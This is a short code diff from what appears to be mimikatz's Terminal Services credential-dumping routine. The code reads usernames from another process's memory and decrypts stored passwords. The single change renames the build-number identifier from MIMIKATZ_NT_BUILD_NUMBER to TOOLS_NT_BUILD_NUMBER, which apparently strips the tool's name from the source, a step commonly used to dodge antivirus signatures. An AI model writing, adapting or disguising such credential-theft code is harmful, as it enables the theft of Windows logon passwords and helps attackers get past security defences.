@@ -253,7 +253,7 @@ BOOL CALLBACK kuhl_m_ts_logonpasswords_MemoryAnalysis(PMEMORY_BASIC_INFORMATION 
 											pKiwiData->cbUsername / sizeof(wchar_t), pKiwiData->UserName
 											);
 
-										if(pKiwiData->cbPassword && (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
+										if(pKiwiData->cbPassword && (TOOLS_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10))
 										{
 											decStatus = kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, pKiwiData->Password, sizeof(pKiwiData->Password), CRYPTPROTECTMEMORY_SAME_PROCESS);
 										}
